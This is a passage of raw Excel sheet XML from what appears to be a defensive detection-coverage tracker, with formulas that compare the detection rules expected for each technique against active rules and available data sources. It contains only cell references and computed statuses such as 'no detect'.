    <row r="85" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A85" t="s">
        <v>711</v>
      </c>
      <c r="B85" t="s">
        <v>711</v>
      </c>
      <c r="C85" t="s">
        <v>88</v>
      </c>
      <c r="D85" t="s">
        <v>12</v>
      </c>
      <c r="E85" t="s">
        <v>712</v>
      </c>
      <c r="F85" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G85" s="9" cm="1">
        <f t="array" ref="G85">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H85" s="9" cm="1">
        <f t="array" ref="H85">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>1</v>
      </c>
      <c r="I85" s="9" t="str" cm="1">
        <f t="array" ref="I85">IF(SUM(IF($C85=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C85=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J85" s="9" cm="1">
        <f t="array" ref="J8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85" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M85" s="9" cm="1">
        <f t="array" ref="M85">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N85" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O85" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P85" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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85" t="s">
        <v>368</v>
      </c>
      <c r="U85" t="s">
        <v>713</v>
      </c>
      <c r="V85" t="s">
        <v>714</v>
      </c>
      <c r="W85" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="86" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A86" t="s">
        <v>711</v>
      </c>
      <c r="B86" t="s">
        <v>715</v>
      </c>
      <c r="C86" t="s">
        <v>249</v>
      </c>
      <c r="D86" t="s">
        <v>12</v>
      </c>
      <c r="E86" t="s">
        <v>712</v>
      </c>
      <c r="F86" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G86" s="9" cm="1">
        <f t="array" ref="G86">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H86" s="9" t="str" cm="1">
        <f t="array" ref="H86">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I86" s="9" t="str" cm="1">
        <f t="array" ref="I86">IF(SUM(IF($C86=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C86=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J86" s="9" t="str" cm="1">
        <f t="array" ref="J8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86" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M86" s="9" cm="1">
        <f t="array" ref="M86">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N86" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O86" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P86" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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86" t="s">
        <v>368</v>
      </c>
      <c r="U86" t="s">
        <v>716</v>
      </c>
      <c r="V86" t="s">
        <v>714</v>
      </c>
      <c r="W86" t="b">
        <v>1</v>
      </c>
      <c r="X86" t="s">
        <v>711</v>
      </c>
    </row>
    <row r="87" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A87" t="s">
        <v>717</v>
      </c>
      <c r="B87" t="s">
        <v>717</v>
      </c>
      <c r="C87" t="s">
        <v>105</v>
      </c>
      <c r="D87" t="s">
        <v>718</v>
      </c>
      <c r="E87" t="s">
        <v>719</v>
      </c>
      <c r="F87" s="9">
        <f t="shared" si="1"/>
        <v>6</v>
      </c>
      <c r="G87" s="9" cm="1">
        <f t="array" ref="G87">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H87" s="9" cm="1">
        <f t="array" ref="H87">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>5</v>
      </c>
      <c r="I87" s="9" t="str" cm="1">
        <f t="array" ref="I87">IF(SUM(IF($C87=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C87=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J87" s="9" cm="1">
        <f t="array" ref="J8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87" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>5</v>
      </c>
      <c r="M87" s="9" cm="1">
        <f t="array" ref="M87">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>5</v>
      </c>
      <c r="N87" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O87" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P87" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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87" t="s">
        <v>598</v>
      </c>
      <c r="U87" t="s">
        <v>720</v>
      </c>
      <c r="V87" t="s">
        <v>721</v>
      </c>
      <c r="W87" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="88" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A88" t="s">
        <v>717</v>
      </c>
      <c r="B88" t="s">
        <v>722</v>
      </c>
      <c r="C88" t="s">
        <v>723</v>
      </c>
      <c r="D88" t="s">
        <v>718</v>
      </c>
      <c r="E88" t="s">
        <v>724</v>
      </c>
      <c r="F88" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G88" s="9" cm="1">
        <f t="array" ref="G88">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H88" s="9" t="str" cm="1">
        <f t="array" ref="H88">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I88" s="9" t="str" cm="1">
        <f t="array" ref="I88">IF(SUM(IF($C88=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C88=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J88" s="9" t="str" cm="1">
        <f t="array" ref="J8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88" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M88" s="9" cm="1">
        <f t="array" ref="M88">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N88" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O88" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P88" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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88" t="s">
        <v>368</v>
      </c>
      <c r="U88" t="s">
        <v>725</v>
      </c>
      <c r="V88" t="s">
        <v>726</v>
      </c>
      <c r="W88" t="b">
        <v>1</v>
      </c>
      <c r="X88" t="s">
        <v>717</v>
      </c>
    </row>
    <row r="89" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A89" t="s">
        <v>717</v>
      </c>
      <c r="B89" t="s">
        <v>727</v>
      </c>
      <c r="C89" t="s">
        <v>728</v>
      </c>
      <c r="D89" t="s">
        <v>718</v>
      </c>
      <c r="E89" t="s">
        <v>729</v>
      </c>
      <c r="F89" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G89" s="9" cm="1">
        <f t="array" ref="G89">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H89" s="9" t="str" cm="1">
        <f t="array" ref="H89">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I89" s="9" t="str" cm="1">
        <f t="array" ref="I89">IF(SUM(IF($C89=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C89=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J89" s="9" t="str" cm="1">
        <f t="array" ref="J8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89" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M89" s="9" cm="1">
        <f t="array" ref="M89">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N89" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O89" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P89" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S8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89" t="s">
        <v>503</v>
      </c>
      <c r="U89" t="s">
        <v>730</v>
      </c>
      <c r="V89" t="s">
        <v>731</v>
      </c>
      <c r="W89" t="b">
        <v>1</v>
      </c>
      <c r="X89" t="s">
        <v>717</v>
      </c>
    </row>
    <row r="90" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A90" t="s">
        <v>717</v>
      </c>
      <c r="B90" t="s">
        <v>732</v>
      </c>
      <c r="C90" t="s">
        <v>241</v>
      </c>
      <c r="D90" t="s">
        <v>718</v>
      </c>
      <c r="E90" t="s">
        <v>733</v>
      </c>
      <c r="F90" s="9">
        <f t="shared" si="1"/>
        <v>7</v>
      </c>
      <c r="G90" s="9" cm="1">
        <f t="array" ref="G90">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>2</v>
      </c>
      <c r="H90" s="9" t="str" cm="1">
        <f t="array" ref="H90">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I90" s="9" t="str" cm="1">
        <f t="array" ref="I90">IF(SUM(IF($C90=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C90=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J90" s="9" t="str" cm="1">
        <f t="array" ref="J9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90" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M90" s="9" cm="1">
        <f t="array" ref="M90">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N90" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O90" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P90" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S9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90" t="s">
        <v>386</v>
      </c>
      <c r="U90" t="s">
        <v>734</v>
      </c>
      <c r="V90" t="s">
        <v>735</v>
      </c>
      <c r="W90" t="b">
        <v>1</v>
      </c>
      <c r="X90" t="s">
        <v>717</v>
      </c>
    </row>
    <row r="91" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A91" t="s">
        <v>717</v>
      </c>
      <c r="B91" t="s">
        <v>736</v>
      </c>
      <c r="C91" t="s">
        <v>737</v>
      </c>
      <c r="D91" t="s">
        <v>718</v>
      </c>
      <c r="E91" t="s">
        <v>729</v>
      </c>
      <c r="F91" s="9">
        <f t="shared" si="1"/>
        <v>4</v>
      </c>
      <c r="G91" s="9" cm="1">
        <f t="array" ref="G91">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H91" s="9" t="str" cm="1">
        <f t="array" ref="H91">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I91" s="9" t="str" cm="1">
        <f t="array" ref="I91">IF(SUM(IF($C91=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C91=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J91" s="9" t="str" cm="1">
        <f t="array" ref="J9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91" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M91" s="9" cm="1">
        <f t="array" ref="M91">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N91" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O91" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P91" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S9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91" t="s">
        <v>416</v>
      </c>
      <c r="U91" t="s">
        <v>738</v>
      </c>
      <c r="V91" t="s">
        <v>739</v>
      </c>
      <c r="W91" t="b">
        <v>1</v>
      </c>
      <c r="X91" t="s">
        <v>717</v>
      </c>
    </row>
    <row r="92" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A92" t="s">
        <v>717</v>
      </c>
      <c r="B92" t="s">
        <v>740</v>
      </c>
      <c r="C92" t="s">
        <v>741</v>
      </c>
      <c r="D92" t="s">
        <v>718</v>
      </c>
      <c r="E92" t="s">
        <v>742</v>
      </c>
      <c r="F92" s="9">
        <f t="shared" si="1"/>
        <v>3</v>
      </c>
      <c r="G92" s="9" cm="1">
        <f t="array" ref="G92">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H92" s="9" t="str" cm="1">
        <f t="array" ref="H92">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I92" s="9" t="str" cm="1">
        <f t="array" ref="I92">IF(SUM(IF($C92=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C92=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J92" s="9" t="str" cm="1">
        <f t="array" ref="J9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92" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M92" s="9" cm="1">
        <f t="array" ref="M92">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N92" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O92" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P92" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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92" t="s">
        <v>743</v>
      </c>
      <c r="U92" t="s">
        <v>744</v>
      </c>
      <c r="V92" t="s">
        <v>745</v>
      </c>
      <c r="W92" t="b">
        <v>1</v>
      </c>
      <c r="X92" t="s">
        <v>717</v>
      </c>
    </row>
    <row r="93" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A93" t="s">
        <v>746</v>
      </c>
      <c r="B93" t="s">
        <v>746</v>
      </c>
      <c r="C93" t="s">
        <v>144</v>
      </c>
      <c r="D93" t="s">
        <v>747</v>
      </c>
      <c r="E93" t="s">
        <v>748</v>
      </c>
      <c r="F93" s="9">
        <f t="shared" si="1"/>
        <v>7</v>
      </c>
      <c r="G93" s="9" cm="1">
        <f t="array" ref="G93">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H93" s="9" cm="1">
        <f t="array" ref="H93">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>12</v>
      </c>
      <c r="I93" s="9" t="str" cm="1">
        <f t="array" ref="I93">IF(SUM(IF($C93=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C93=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J93" s="9" cm="1">
        <f t="array" ref="J9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93" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>12</v>
      </c>
      <c r="M93" s="9" cm="1">
        <f t="array" ref="M93">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>12</v>
      </c>
      <c r="N93" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O93" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P93" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S9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93" t="s">
        <v>368</v>
      </c>
      <c r="U93" t="s">
        <v>749</v>
      </c>
      <c r="V93" t="s">
        <v>750</v>
      </c>
      <c r="W93" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="94" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A94" t="s">
        <v>746</v>
      </c>
      <c r="B94" t="s">
        <v>751</v>
      </c>
      <c r="C94" t="s">
        <v>752</v>
      </c>
      <c r="D94" t="s">
        <v>747</v>
      </c>
      <c r="E94" t="s">
        <v>753</v>
      </c>
      <c r="F94" s="9">
        <f t="shared" si="1"/>
        <v>5</v>
      </c>
      <c r="G94" s="9" cm="1">
        <f t="array" ref="G94">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H94" s="9" t="str" cm="1">
        <f t="array" ref="H94">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I94" s="9" t="str" cm="1">
        <f t="array" ref="I94">IF(SUM(IF($C94=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C94=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J94" s="9" t="str" cm="1">
        <f t="array" ref="J9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94" s="9">
